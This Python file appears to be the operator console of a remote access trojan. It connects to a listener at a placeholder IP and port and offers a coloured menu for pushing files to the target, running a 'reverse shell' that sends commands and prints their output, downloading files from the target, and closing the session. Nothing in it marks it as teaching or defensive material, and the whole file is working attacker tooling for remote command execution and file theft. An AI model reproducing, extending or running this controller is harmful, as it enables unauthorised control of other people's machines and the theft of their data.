import socket 
from colorama import Fore 


ip = '127.0.0.1'    # Enter the Ip
port = 12345        # Enter the Port
client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
client.connect((ip , port))
print('connected')
 
client.send('main'.encode('utf-8'))
con = client.recv(1024).decode('utf-8')

def t_check() : 
        if client.recv(4096).decode('utf-8') != 'done' :
            t_check()

def m_check() : 
    client.send('done'.encode('utf-8',errors='ignore')) 
        
if con == 'connected' : 
    while True :
        try :
            option = input(Fore.LIGHTRED_EX+'1)'+Fore.LIGHTGREEN_EX+' Transfer File (Send)\n'+
                        Fore.LIGHTRED_EX+'2)'+Fore.LIGHTGREEN_EX+' Reverse Shell\n'+
                        Fore.LIGHTRED_EX+'3)'+Fore.LIGHTGREEN_EX+' Transfer File (Get)\n'+
                        Fore.LIGHTRED_EX+'4)'+Fore.LIGHTGREEN_EX+' Close Connection\n'+Fore.LIGHTWHITE_EX)

            if option == '1' : 
                main_path = input(Fore.LIGHTYELLOW_EX+'enter path : '+Fore.LIGHTWHITE_EX)
                target_path = input(Fore.LIGHTYELLOW_EX+'enter the target path : '+Fore.LIGHTWHITE_EX)
                if main_path!='exit' and target_path!='exit' :
                    with open('\\'.join(main_path.split('\/')),'rb') as file : 
                        t_file = file.read()
                        file.close() 
                  
                    client.send('transfer'.encode('utf-8',errors='ignore'))
                    t_check() 
                    print(f"\r1/4", end='')
                    client.send(target_path.encode('utf-8',errors='ignore'))
                    t_check()
                    print(f"\r2/4", end='')
                    client.send(str(len(t_file)).encode('utf-8',errors='ignore'))
                    t_check()
                    print(f"\r3/4", end='')
                    client.sendall(t_file)
                    client.send('done'.encode('utf-8',errors='ignore'))
                    t_check()
                    print(f"\r4/4\n", end='')
                    print(Fore.LIGHTCYAN_EX+'proccess finished ...\n')
                    
            if option == '2' : 
                while True :
                
                    command = input(Fore.LIGHTYELLOW_EX+'enter command : ')
                            
                    if command == 'exit' : 
                        break 
                    
                        
                    else : 
                        if  command.rstrip() : 
                            
                            client.send('command'.encode('utf-8',errors='ignore'))
                            t_check()
                            print(f"\r1/4", end='')
                            client.send(command.encode('utf-8',errors='ignore'))
                            t_check()
                            print(f"\r2/4", end='')
                            size = len(client.recv(1024).decode('utf-8',errors='ignore').encode('utf-8',errors='ignore'))
                            m_check()
                            print(f"\r3/4", end='')
                            i=0
                            result = b''
                            while True : 
                                result+=client.recv(4096)
                                if result[-4:] == b'done' : 
                                    result = result[:-4]
                                    break
                                
                            print(f"\r4/4\n", end='')
                            result = result.decode('utf-8',errors='ignore')
                            print(Fore.LIGHTCYAN_EX+f'{result}')
            if option == '3' : 
                target_path = input('enter target file path : ')
                main_path = input('enter save path : ')
                main_path = '\\'.join(main_path.split('\/'))
                client.send('copy'.encode('utf-8',errors='ignore'))
                t_check()
                print(f"\r1/4", end='')
                client.send(target_path.encode('utf-8',errors='ignore'))
                t_check()   
                print(f"\r2/4", end='')   
                size = int(client.recv(4096).decode('utf-8',errors='ignore'))
                m_check()
                print(f"\r3/4", end='')
                result = b''
                while True : 
                    result+=client.recv(4096)
                    if result[-4:] == b'done' : 
                        result = result[:-4]
                        break 
                    
                print(f"\r4/4\n", end='')
                with open(main_path,'wb') as file : 
                    file.write(result)
                    file.close()
                print(Fore.LIGHTCYAN_EX+'transfering finished')
            if option == '4' : 
                client.send('close'.encode('utf-8',errors='ignore'))
                client.close()
                break
        except Exception as e : 
            print(e)
            client.close()
            break
                
            


        
        
        
